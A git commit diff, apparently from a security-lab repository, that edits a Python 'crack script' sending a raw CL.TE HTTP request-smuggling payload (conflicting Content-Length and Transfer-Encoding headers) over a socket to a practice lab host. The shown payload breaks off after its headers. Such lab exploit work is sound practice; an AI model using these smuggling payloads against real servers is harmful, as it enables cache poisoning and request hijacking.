6310d88200b35db86816c1888b8865857336c5cf
Laplas <61288992+Laplas00@users.noreply.github.com>
2025-07-05 16:58:41 +0300

    fix

--- vps-labs-api/__crack_scripts__/cl_te.py
+++ vps-labs-api/__crack_scripts__/cl_te.py
@@ -1,7 +1,7 @@
 import socket
 
-# HOST = 'lap3-http_request_smuggling_cache_poison.labs-is-here.online'  # Адрес твоего сервера
-HOST = '0.0.0.0'
+HOST = 'lap3-poc_confirming_cl_te.labs-is-here.online'  # Адрес твоего сервера
+# HOST = '0.0.0.0'
 
 # PORT = 80
 PORT = 9000        # Порт (если Flask dev-сервер, то 5000)
@@ -9,7 +9,7 @@ PORT = 9000        # Порт (если Flask dev-сервер, то 5000)
 
 payload = (
     "POST / HTTP/1.1\r\n"
-    "Host: localhost\r\n"
+    f"Host: {HOST}\r\n"
     "Content-Length: 49\r\n"
     "Transfer-Encoding: chunked\r\n"
     "\r\n"
